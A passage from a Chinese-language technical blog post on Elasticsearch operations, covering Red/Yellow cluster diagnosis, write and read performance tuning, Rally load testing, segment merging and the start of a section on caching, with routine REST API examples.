id="解决集群-Yellow-与-Red-的问题"><a href="#解决集群-Yellow-与-Red-的问题" class="headerlink" title="解决集群 Yellow 与 Red 的问题"></a>解决集群 Yellow 与 Red 的问题</h2><h3 id="集群健康度"><a href="#集群健康度" class="headerlink" title="集群健康度"></a>集群健康度</h3><ul><li>分片健康<ul><li>红：至少有一个主分片没有分配</li><li>黄：至少有一个副本没有分配</li><li>绿：主副本分片全部正常分配</li></ul></li><li>索引健康：最差的分片的状态</li><li>集群健康：最差的索引的状态</li></ul><h3 id="Health-相关的-API"><a href="#Health-相关的-API" class="headerlink" title="Health 相关的 API"></a>Health 相关的 API</h3><table><thead><tr><th align="left"></th><th align="left"></th></tr></thead><tbody><tr><td align="left">GET _cluster/health</td><td align="left">集群的状态（检查 节点数量）</td></tr><tr><td align="left">GET _cluster/health?level=indices</td><td align="left">所有索引的健康状态 （查看有问题的索引)</td></tr><tr><td align="left">GET _cluster/health/my_index</td><td align="left">单个索引的健康状态（查看具体的索引）</td></tr><tr><td align="left">GET _cluster/health?level=shards</td><td align="left">分片级的索引</td></tr><tr><td align="left">GET _cluster/allocation/explain</td><td align="left">返回第一个未分配 Shard 的原因</td></tr></tbody></table><p><img src="/images/big-data/es-07/29.jpg" alt="29"></p><h3 id="案例-1"><a href="#案例-1" class="headerlink" title="案例 1"></a>案例 1</h3><ul><li>症状：集群变红</li><li>分析：通过 Allocation Explain API 发现 创建索引失败，因为无法找到标记了相应 box type<br>的节点</li><li>解决：删除索引，集群变绿。重新创建索引，并且指定正确的 routing box type，索引创建成<br>功。集群保持绿色状态</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">PUT mytest</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>:&#123;</span><br><span class="line">    <span class="attr">"number_of_shards"</span>:<span class="number">3</span>,</span><br><span class="line">    <span class="attr">"number_of_replicas"</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="attr">"index.routing.allocation.require.box_type"</span>:<span class="string">"hott"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 检查集群状态，查看是否有节点丢失，有多少分片无法分配</span></span><br><span class="line">GET /_cluster/health/</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看索引级别,找到红色的索引</span></span><br><span class="line">GET /_cluster/health?level=indices</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看索引的分片</span></span><br><span class="line">GET _cluster/health?level=shards</span><br><span class="line"></span><br><span class="line"><span class="comment">// Explain 变红的原因</span></span><br><span class="line">GET /_cluster/allocation/explain</span><br><span class="line"><span class="comment">//return </span></span><br><span class="line">"deciders" : [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">"decider"</span> : <span class="string">"filter"</span>,</span><br><span class="line">          <span class="attr">"decision"</span> : <span class="string">"NO"</span>,</span><br><span class="line">          <span class="attr">"explanation"</span> : <span class="string">""</span><span class="string">"node does not match index setting [index.routing.allocation.require] filters [box_type:"</span>hott<span class="string">"]"</span><span class="string">""</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line"></span><br><span class="line">GET /_cat/shards/mytest</span><br><span class="line"></span><br><span class="line">GET _cat/nodeattrs</span><br><span class="line"></span><br><span class="line">DELETE mytest</span><br><span class="line"><span class="comment">// 查看集群 集群变绿</span></span><br><span class="line">GET /_cluster/health/</span><br><span class="line"></span><br><span class="line">PUT mytest</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>:&#123;</span><br><span class="line">    <span class="attr">"number_of_shards"</span>:<span class="number">3</span>,</span><br><span class="line">    <span class="attr">"number_of_replicas"</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="attr">"index.routing.allocation.require.box_type"</span>:<span class="string">"hot"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="案例-2"><a href="#案例-2" class="headerlink" title="案例 2"></a>案例 2</h3><ul><li>症状：集群变黄</li><li>分析：通过 Allocation Explain API 发现无法在相同的节点上创建副本</li><li>解决：将索引的副本数设置为 0，或者通过增加节点解决</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT mytest</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"settings"</span>:&#123;</span><br><span class="line">  <span class="attr">"number_of_shards"</span>:<span class="number">2</span>,</span><br><span class="line">  <span class="attr">"number_of_replicas"</span>:<span class="number">1</span>,</span><br><span class="line">  <span class="attr">"index.routing.allocation.require.box_type"</span>:<span class="string">"hot"</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">GET _cluster/health</span><br><span class="line">GET _cat/shards/mytest</span><br><span class="line">GET /_cluster/allocation/explain</span><br><span class="line">PUT mytest/_settings</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"number_of_replicas"</span>: <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分片没有被分配的一些原因"><a href="#分片没有被分配的一些原因" class="headerlink" title="分片没有被分配的一些原因"></a>分片没有被分配的一些原因</h3><ul><li>INDEX_CREATE: 创建索引导致。在索引的全部分片分配完成之前，会有短暂的 Red，不一定代表有问题</li><li>CLUSTER_RECOVER：集群重启阶段，会有这个问题</li><li>INDEX_REOPEN：Open 一个之前 Close 的索引</li><li>DANGLING_INDEX_IMPORTED：一个节点离开集群期间，有索引被删除。这个节点重新返回时，会导致 Dangling 的问题</li></ul><blockquote><p><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/cat-shards.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/cat-shards.html</a></p></blockquote><h3 id="常见问题与解决方法"><a href="#常见问题与解决方法" class="headerlink" title="常见问题与解决方法"></a>常见问题与解决方法</h3><ul><li>集群变红，需要检查是否有节点离线。如果有，通常通过重启离线的节点可以解决问题</li><li>由于配置导致的问题，需要修复相关的配置（例如错误的 box_type，错误的副本数）<ul><li>如果是测试的索引，可以直接删除</li></ul></li><li>因为磁盘空间限制，分片规则（Shard Filtering）引发的，需要调整规则或者增加节点</li><li>对于节点返回集群，导致的 dangling 变红，可直接删除 dangling 索引</li></ul><h3 id="集群-Red-amp-Yellow-问题的总结"><a href="#集群-Red-amp-Yellow-问题的总结" class="headerlink" title="集群 Red &amp; Yellow 问题的总结"></a>集群 Red &amp; Yellow 问题的总结</h3><ul><li>Red &amp; Yellow 是集群运维中常见的问题</li><li>除了集群故障，一些创建，增加副本等操作，都会导致集群短暂的 Red 和 Yellow，所以监控和报警时需要设置一定的延时</li><li>通过检查节点数，使用 ES 提供的相关 API，找到真正的原因</li><li>可以指定 Move 或者 Reallocate 分片</li></ul><p><img src="/images/big-data/es-07/30.jpg" alt="30"></p><h2 id="提升集群写性能"><a href="#提升集群写性能" class="headerlink" title="提升集群写性能"></a>提升集群写性能</h2><h3 id="提高写入性能的方法"><a href="#提高写入性能的方法" class="headerlink" title="提高写入性能的方法"></a>提高写入性能的方法</h3><ul><li>写性能优化的目标：增大写吞吐量（Events Per Second），越高越好</li><li>客户端：多线程，批量写<ul><li>可以通过性能测试，确定最佳文档数量</li><li>多线程：需要观察是否有 HTTP 429 返回，实现 Retry 以及线程数量的自动调节</li></ul></li><li>服务器端：单个性能问题，往往是多个因素造成的。需要先分解问题，在单个节点上进行调整并 且结合测试，尽可能压榨硬件资源，以达到最高吞吐量<ul><li>使用更好的硬件。观察 CPU / IO Block</li><li>线程切换 / 堆栈状况</li></ul></li></ul><h3 id="服务器端优化写入性能的一些手段"><a href="#服务器端优化写入性能的一些手段" class="headerlink" title="服务器端优化写入性能的一些手段"></a>服务器端优化写入性能的一些手段</h3><ul><li>降低 IO 操作<ul><li>使用 ES 自动生成的文档 Id / 一些相关的 ES 配置，如 Refresh Interval</li></ul></li><li>降低 CPU 和存储开销<ul><li>减少不必要分词 / 避免不需要的 doc_values / 文档的字段尽量保证相同的顺序，可以提高文档的压缩率</li></ul></li><li>尽可能做到写入和分片的均衡负载，实现水平扩展<ul><li>Shard Filtering / Write Load Balancer</li></ul></li><li>调整 Bulk 线程池和队列</li></ul><h3 id="优化写入性能"><a href="#优化写入性能" class="headerlink" title="优化写入性能"></a>优化写入性能</h3><ul><li>ES 的默认设置，已经综合考虑了数据可靠性，搜索的实时性质，写入速度，一般不要盲目修改</li><li>一切优化，都要基于<strong>高质量的数据建模</strong></li></ul><h3 id="关闭无关的功能"><a href="#关闭无关的功能" class="headerlink" title="关闭无关的功能"></a>关闭无关的功能</h3><ul><li>只需要聚合不需要搜索，Index 设置成 false</li><li>不需要算分， Norms 设置成 false</li><li>不要对字符串使用默认的 dynamic mapping。字段 数量过多，会对性能产生比较大的影响</li><li>Index_options 控制在创建倒排索引时，哪些内容会被添加到倒排索引中。优化这些设置，一定程度 可以节约 CPU</li><li>关闭 _source，减少 IO 操作；（适合指标型数据）</li></ul><p><img src="/images/big-data/es-07/31.jpg" alt="31"></p><h3 id="针对性能的取舍"><a href="#针对性能的取舍" class="headerlink" title="针对性能的取舍"></a>针对性能的取舍</h3><ul><li>如果需要追求极致的写入速度，可以牺牲数据可靠性及搜索实时性以换取性能<ul><li>牺牲可靠性：将副本分片设置为 0，写入完毕再调整回去</li><li>牺牲搜索实时性：增加 Refresh Interval 的时间</li><li>牺牲可靠性：修改 Translog 的配置</li></ul></li></ul><h3 id="数据写入的过程"><a href="#数据写入的过程" class="headerlink" title="数据写入的过程"></a>数据写入的过程</h3><ul><li>Refresh<ul><li>将文档先保存在 Index buffer 中， <strong>以 refresh_interval 为间隔时间</strong>，定期清空 buffer，生成 segment，借助文件系统缓存的特性，先将 segment 放在文件系统缓存中，并开放查询，以提升搜索的实时性</li></ul></li><li>Translog<ul><li>Segment 没有写入磁盘，即便发生了当机，重启后，数据也能恢复，<strong>默认配置是每次请求都会落盘</strong></li></ul></li><li>Flush<ul><li>删除旧的 translog 文件</li><li>生成 Segment 并写入磁盘 / 更新 commit point 并写入磁盘。<strong>ES 自动完成，可优化点不多</strong></li></ul></li></ul><h3 id="Refresh-Interval"><a href="#Refresh-Interval" class="headerlink" title="Refresh Interval"></a>Refresh Interval</h3><ul><li>降低 Refresh 的频率<ul><li>增加 refresh_interval 的数值。默认为 1s ，如果设置成 -1 ，会禁止自动 refresh<ul><li>避免过于频繁的 refresh，而生成过多的 segment 文件</li><li>但是会降低搜索的实时性</li></ul></li><li>增大静态配置参数 <code>indices.memory.index_buffer_size</code><ul><li>默认是 10%， 会导致自动触发 refresh</li></ul></li></ul></li></ul><h3 id="Translog"><a href="#Translog" class="headerlink" title="Translog"></a>Translog</h3><ul><li>降低写磁盘的频率，但是会降低容灾能力<ul><li><code>Index.translog.durability</code>：默认是 request，每个请求都落盘。设置成 async，异步写入</li><li><code>Index.translog.sync_interval</code> 设置为 60s，每分钟执行一次</li><li><code>Index.translog.flush_threshod_size</code>: 默认 512 mb，可以适当调大。当 translog 超过该值，会触发 flush</li></ul></li></ul><h3 id="分片设定"><a href="#分片设定" class="headerlink" title="分片设定"></a>分片设定</h3><ul><li>副本在写入时设为 0，完成后再增加</li><li>合理设置主分片数，确保均匀分配在所有数据节点上<ul><li><code>Index.routing.allocation.total_share_per_node</code>: 限定每个索引在每个节点上可分配的分片数（replicas and primaries）</li><li>5 个节点的集群。 索引有 5 个主分片，1 个副本，应该如何设置？<ul><li>(5+5) / 5 = 2</li><li>生产环境中要适当调大这个数字，避免有节点下线时，分片无法正常迁移</li></ul></li></ul></li></ul><h3 id="Bulk，线程池和队列大小"><a href="#Bulk，线程池和队列大小" class="headerlink" title="Bulk，线程池和队列大小"></a>Bulk，线程池和队列大小</h3><ul><li>客户端<ul><li>单个 bulk 请求体的数据量不要太大，官方建议大约 5-15mb</li><li>写入端的 bulk 请求超时需要足够长，建议 60s 以上</li><li>写入端尽量将数据轮询打到不同节点。</li></ul></li><li>服务器端<ul><li>索引创建属于计算密集型任务，应该使用固定大小的线程池来配置。来不及处理的放入队列，线程数应该 配置成 CPU 核心数 +1 ，避免过多的上下文切换</li><li>队列大小可以适当增加，不要过大，否则占用的内存会成为 GC 的负担</li></ul></li></ul><h3 id="一个索引设定的例子"><a href="#一个索引设定的例子" class="headerlink" title="一个索引设定的例子"></a>一个索引设定的例子</h3><p><img src="/images/big-data/es-07/32.jpg" alt="32"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">DELETE myindex</span><br><span class="line">PUT myindex</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>: &#123;</span><br><span class="line">    <span class="attr">"index"</span>: &#123;</span><br><span class="line">      <span class="attr">"refresh_interval"</span>: <span class="string">"30s"</span>,</span><br><span class="line">      <span class="attr">"number_of_shards"</span>: <span class="string">"2"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"routing"</span>: &#123;</span><br><span class="line">      <span class="attr">"allocation"</span>: &#123;</span><br><span class="line">        <span class="attr">"total_shards_per_node"</span>: <span class="string">"3"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"translog"</span>: &#123;</span><br><span class="line">      <span class="attr">"sync_interval"</span>: <span class="string">"30s"</span>,</span><br><span class="line">      <span class="attr">"durability"</span>: <span class="string">"async"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"number_of_replicas"</span>: <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">    <span class="attr">"dynamic"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">"properties"</span>: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="提升集群读性能"><a href="#提升集群读性能" class="headerlink" title="提升集群读性能"></a>提升集群读性能</h2><h3 id="尽量-Denormalize-数据"><a href="#尽量-Denormalize-数据" class="headerlink" title="尽量 Denormalize 数据"></a>尽量 Denormalize 数据</h3><ul><li>Elasticsearch != 关系型数据库</li><li>尽可能 Denormalize 数据，从而获取最佳的性能<ul><li>使用 Nested 类型的数据。查询速度会慢几倍</li><li>使用 Parent / Child 关系。查询速度会慢几百倍</li></ul></li></ul><h3 id="数据建模"><a href="#数据建模" class="headerlink" title="数据建模"></a>数据建模</h3><ul><li>尽量将数据先行计算，然后保存到 Elasticsearch 中。尽量避免查询时的 Script 计算</li><li>尽量使用 Filter Context，利用缓存机制，减少不必要的算分</li><li>结合 profile，explain API 分析慢查询的问题，持续优化数据模型<ul><li>严禁使用 * 开头通配符 Terms 查询</li></ul></li></ul><h3 id="避免查询时脚本"><a href="#避免查询时脚本" class="headerlink" title="避免查询时脚本"></a>避免查询时脚本</h3><ul><li>可以在 Index 文档时，使用 Ingest Pipeline，计算并写入某个字段</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">PUT blogs/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"title"</span>:<span class="string">"elasticsearch"</span></span><br><span class="line">&#125;</span><br><span class="line">GET blogs/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"bool"</span>: &#123;</span><br><span class="line">      <span class="attr">"must"</span>: [</span><br><span class="line">        &#123;<span class="attr">"match"</span>: &#123;</span><br><span class="line">          <span class="attr">"title"</span>: <span class="string">"elasticsearch"</span></span><br><span class="line">        &#125;&#125;</span><br><span class="line">      ],</span><br><span class="line">      </span><br><span class="line">      <span class="attr">"filter"</span>: &#123;</span><br><span class="line">        <span class="attr">"script"</span>: &#123;</span><br><span class="line">          <span class="attr">"script"</span>: &#123;</span><br><span class="line">            <span class="attr">"source"</span>: <span class="string">"doc['title.keyword'].value.length()&gt;5"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="常见的查询性能问题-使用-Query-Context"><a href="#常见的查询性能问题-使用-Query-Context" class="headerlink" title="常见的查询性能问题 - 使用 Query Context"></a>常见的查询性能问题 - 使用 Query Context</h3><p><img src="/images/big-data/es-07/33.jpg" alt="33"></p><h3 id="聚合文档消耗内存"><a href="#聚合文档消耗内存" class="headerlink" title="聚合文档消耗内存"></a>聚合文档消耗内存</h3><ul><li>聚合查询会消耗内存，特别是针对很大的数据集进行聚合运算<ul><li>如果可以控制聚合的数量，就能减少内存的开销</li></ul></li><li>当需要使用不同的 Query Scope，可以使用 <strong>Filter Bucket</strong></li></ul><p><img src="/images/big-data/es-07/35.jpg" alt="35"></p><h3 id="通配符开始的正则表达"><a href="#通配符开始的正则表达" class="headerlink" title="通配符开始的正则表达"></a>通配符开始的正则表达</h3><ul><li>通配符开头的正则，性能非常糟糕，需避免使用</li></ul><p><img src="/images/big-data/es-07/36.jpg" alt="36"></p><h3 id="优化分片"><a href="#优化分片" class="headerlink" title="优化分片"></a>优化分片</h3><ul><li>避免 Over Sharing<ul><li>一个查询需要访问每一个分片，分片过多，会导致不必要的查询开销</li></ul></li><li>结合应用场景，控制单个分片的尺寸<ul><li>Search：20GB</li><li>Logging：40GB</li></ul></li><li>Force-merge Read-only 索引<ul><li>使用基于时间序列的索引，将只读的索引进行 force merge，减少 segment 数</li></ul></li></ul><h3 id="读性能优化"><a href="#读性能优化" class="headerlink" title="读性能优化"></a>读性能优化</h3><ul><li>影响查询性能的一些因素<ul><li>数据模型和索引配置是否优化</li><li>数据规模是否过大，通过 Filter 减少不必要的数据计算</li><li>查询语句是否优化</li></ul></li></ul><h2 id="集群压力测试"><a href="#集群压力测试" class="headerlink" title="集群压力测试"></a>集群压力测试</h2><h3 id="压力测试"><a href="#压力测试" class="headerlink" title="压力测试"></a>压力测试</h3><ul><li>压力测试的目的<ul><li>容量规划 / 性能优化 / 版本间性能比较 / 性能问题诊断</li><li>确定系统稳定性，考察系统功能极限和隐患</li></ul></li><li>压力测试的方法与步骤<ul><li>测试计划（确定测试场景和测试数据集）</li><li>脚本开发</li><li>测试环境搭建（不同的软硬件配置） &amp; 运行测试</li><li>分析比较结果</li></ul></li></ul><h3 id="测试目标-amp-测试数据"><a href="#测试目标-amp-测试数据" class="headerlink" title="测试目标 &amp; 测试数据"></a>测试目标 &amp; 测试数据</h3><ul><li>测试目标<ul><li>测试集群的读写性能 / 做集群容量规划</li><li>对 ES 配置参数进行修改，评估优化效果</li><li>修改 Mapping 和 Setting，对数据建模进行优化，并测试评估性能改进</li><li>测试 ES 新版本，结合实际场景和老版本进行比较，评估是否进行升级</li></ul></li><li>测试数据<ul><li>数据量 / 数据分布</li></ul></li></ul><h3 id="测试脚本"><a href="#测试脚本" class="headerlink" title="测试脚本"></a>测试脚本</h3><ul><li>ES 本身提供了 REST API，所以，可以通过很多传统的性能测试工具<ul><li>Load Runner （商业软件，支持录制 + 重放 + DSL ）</li><li>JMeter （ Apache 开源 ，Record &amp; Play）</li><li>Gatling （开源，支持写 Scala 代码 + DSL）</li></ul></li><li>专门为 Elasticsearch 设计的工具<ul><li>ES Pref &amp; Elasticsearch-stress-test</li><li>Elastic Rally</li></ul></li></ul><h3 id="ES-Rally-简介"><a href="#ES-Rally-简介" class="headerlink" title="ES Rally 简介"></a>ES Rally 简介</h3><ul><li>Elastic 官方开源，基于 Python 3 的压力测试工具<ul><li><a href="https://github.com/elastic/rally" target="_blank" rel="noopener">https://github.com/elastic/rally</a></li><li>性能测试结果比较：<a href="https://elasticsearch-benchmarks.elastic.co" target="_blank" rel="noopener">https://elasticsearch-benchmarks.elastic.co</a></li></ul></li><li>功能介绍<ul><li>自动创建，配置，运行测试，并且销毁 ES 集群</li><li>支持不同的测试数据的比较，也支持将数据导入 ES 集群，进行二次分析</li><li>支持测试时指标数据的搜集，方便对测试结果进行深度的分析</li></ul></li></ul><h3 id="Rally-的安装以及入门"><a href="#Rally-的安装以及入门" class="headerlink" title="Rally 的安装以及入门"></a>Rally 的安装以及入门</h3><ul><li>安装运行<ul><li>Python 3.4+ 和 pip3 / JDK 8 /git 1.9+</li><li>运行 <code>pip3 install esrally</code></li><li>运行 <code>esrally configure</code></li></ul></li><li>运行<ul><li>运行 <code>esrally –distribution-version=7.1.0</code></li><li>运行 1000 条测试数据：<code>esrally –distribution-version=7.1.0 –test-mode</code></li></ul></li></ul><h3 id="Rally-基本概念讲解"><a href="#Rally-基本概念讲解" class="headerlink" title="Rally 基本概念讲解"></a>Rally 基本概念讲解</h3><ul><li>Tournament – 定义测试目标，由多个 race 组成<ul><li>Esrally list races</li></ul></li><li>Track – 赛道：测试数据和测试场景与策 略<ul><li><a href="https://github.com/elastic/rallytracks" target="_blank" rel="noopener">https://github.com/elastic/rallytracks</a></li><li>esrally list tracks</li></ul></li><li>Car – 执行测试方案<ul><li>不同配置的 es 实例</li></ul></li><li>Award – 测试结果和报告</li></ul><h3 id="什么是压测的流程"><a href="#什么是压测的流程" class="headerlink" title="什么是压测的流程"></a>什么是压测的流程</h3><ul><li>Pipeline 指的是压测的一个流程<ul><li>Esrally list pipelines</li></ul></li><li>默认的流程<ul><li>From-source-complete</li><li>From-source-skip-build</li><li>From-distribution</li><li>Benchmak-only (对已有的集群进行测试)</li></ul></li></ul><h3 id="自定义-amp-分布式测试"><a href="#自定义-amp-分布式测试" class="headerlink" title="自定义 &amp; 分布式测试"></a>自定义 &amp; 分布式测试</h3><ul><li>Car<ul><li><a href="https://esrally.readthedocs.io/en/latest/car.html" target="_blank" rel="noopener">https://esrally.readthedocs.io/en/latest/car.html</a></li><li>使用自建的集群</li></ul></li><li>Track<ul><li>自带的测试数据集：Nyc_taxis 4.5 G /logging 1.2G</li><li>更多的测试数据集：<a href="https://github.com/elastic/rally-tracks" target="_blank" rel="noopener">https://github.com/elastic/rally-tracks</a></li></ul></li><li>分布式测试<ul><li><a href="https://esrally.readthedocs.io/en/latest/recipes.html#recipe-distributed-loaddriver" target="_blank" rel="noopener">https://esrally.readthedocs.io/en/latest/recipes.html#recipe-distributed-loaddriver</a></li></ul></li></ul><h3 id="实例：比较不同的版本的性能"><a href="#实例：比较不同的版本的性能" class="headerlink" title="实例：比较不同的版本的性能"></a>实例：比较不同的版本的性能</h3><ul><li>测试<ul><li><code>esrally race –distribution-version=6.0.0 –track=nyc_taxis –challenge=append-noconflicts –user-tag=&quot;version:6.0.0&quot;</code></li><li><code>esrally race –distribution-version=7.1.0 –track=nyc_taxis –challenge=append-noconflicts –user-tag=&quot;version:7.1.0&quot;</code></li></ul></li><li>比较结果<ul><li><code>esrally list races</code></li><li><code>esrally compare –baseline=[6.0.0 race] –contender=[7.1.0 race]</code></li></ul></li></ul><h3 id="实例：比较不同-Mapping-的性能"><a href="#实例：比较不同-Mapping-的性能" class="headerlink" title="实例：比较不同 Mapping 的性能"></a>实例：比较不同 Mapping 的性能</h3><ul><li>测试<ul><li><code>esrally race –distribution-version=7.1.0 –track=nyc_taxis –challenge=append-noconflicts –user-tag=&quot;enableSource:true&quot; –include-tasks=&quot;type:index&quot;</code></li><li>修改：<code>benchmarks/tracks/default/nyc_taxis/mappings.json</code>，修改 <code>_source.enabled 为 false</code></li><li><code>esrally race –distribution-version=7.1.0 –track=nyc_taxis –challenge=append-noconflicts –user-tag=&quot;enableSource:false&quot; –include-tasks=&quot;type:index&quot;</code></li></ul></li><li>比较<ul><li><code>esrally compare –baseline=[enableAll race] –contender=[disableAll race]</code></li></ul></li></ul><h3 id="实例：测试现有集群的性能"><a href="#实例：测试现有集群的性能" class="headerlink" title="实例：测试现有集群的性能"></a>实例：测试现有集群的性能</h3><ul><li>测试<ul><li><code>esrally race –pipeline=benchmark-only –target-hosts=127.0.0.1:9200 –track=geonames -challenge=append-no-conflicts</code></li></ul></li></ul><p><strong>相关阅读</strong></p><ul><li><a href="https://github.com/elastic/rally" target="_blank" rel="noopener">https://github.com/elastic/rally</a></li><li><a href="https://github.com/elastic/rally-tracks" target="_blank" rel="noopener">https://github.com/elastic/rally-tracks</a></li><li><a href="https://logz.io/blog/rally/" target="_blank" rel="noopener">https://logz.io/blog/rally/</a></li></ul><h2 id="段合并优化及注意事项"><a href="#段合并优化及注意事项" class="headerlink" title="段合并优化及注意事项"></a>段合并优化及注意事项</h2><h3 id="Lucene-Index-原理回顾"><a href="#Lucene-Index-原理回顾" class="headerlink" title="Lucene Index 原理回顾"></a>Lucene Index 原理回顾</h3><ul><li>在 Lucene 中，单个倒排索引文件被称为 Segment。Segment 是自包含的，<strong>不可变更</strong>的。 多个 Segments 汇总在一起，称为 Lucene 的 Index，其对应的就是 ES 中的 Shard</li><li>当有新文档写入时，并且执行 Refresh，就会生成一个新 Segment。 Lucene 中有一个文 件，用来记录所有 Segments 信息，叫做 Commit Point。查询时会同时查询所有 Segments，并且对结果汇总。</li><li>删除的文档信息，保存在 “.del” 文件中，查询后会进行过滤。</li><li>Segment 会定期 Merge，合并成一个，同时删除已删除文档</li></ul><p><img src="/images/big-data/es-07/37.jpg" alt="37"></p><h3 id="Merge-优化"><a href="#Merge-优化" class="headerlink" title="Merge 优化"></a>Merge 优化</h3><ul><li>ES 和 Lucene 会自动进行 Merge 操作</li><li>Merge 操作相对比较重，需要优化，降低对系统的影响</li><li>优化点一：降低分段产生的数量 / 频率<ul><li>可以将 Refresh Interval 调整到分钟级别 / <code>indices.memory.index_buffer_size</code> (默认是 10%)</li><li>尽量避免文档的更新操作</li></ul></li><li>优化点二：降低最大分段大小，避免较大的分段继续参与 Merge，节省系统资源。（最终会有多个分段）<ul><li><code>Index.merge.policy.segments_per_tier</code>，默认为 10， 越小需要越多的合并操作</li><li><code>Index.merge.policy.max_merged_segment</code>, 默认 5 GB， 操作此大小以后，就不再参与后续的合并操作</li></ul></li></ul><h3 id="Force-Merge"><a href="#Force-Merge" class="headerlink" title="Force Merge"></a>Force Merge</h3><ul><li>当 Index 不再有写入操作的时候，建议对其进行 force merge<ul><li>提升查询速度 / 减少内存开销</li></ul></li><li>最终分成几个 segments 比较合适？<ul><li>越少越好，最好可以 force merge 成 1 个，但是，Force Merge 会占用大量的网络，IO 和 CPU</li><li>如果不能在业务高峰期之前做完，就需要考虑增大最终的分段数<ul><li>Shard 的大小 / <code>Index.merge.policy.max_merged_segment</code> 的大小</li></ul></li></ul></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST geonames/_forcemerge?max_num_segments=1</span><br><span class="line"></span><br><span class="line">GET _cat/segments/geonames?v</span><br></pre></td></tr></table></figure><h2 id="缓存及使用-Circuit-Breaker-限制内存使用"><a href="#缓存及使用-Circuit-Breaker-限制内存使用" class="headerlink" title="缓存及使用 Circuit Breaker 限制内存使用"></a>缓存及使用 Circuit Breaker 限制内存使用</h2><h3 id="Inside-the-JVM-Heap"><a href="#Inside-the-JVM-Heap" class="headerlink" title="Inside the JVM Heap"></a>Inside the JVM Heap</h3><ul><li>Elasticsearch 的缓存主要分成三大类<ul><li>Node Query Cache （Filter Context）</li><li>Shard Query Cache （Cache Query 的结果）</li><li>Fielddata Cache</li></ul></li></ul><p><img src="/images/big-data/es-07/38.jpg" alt="38"></p><h3 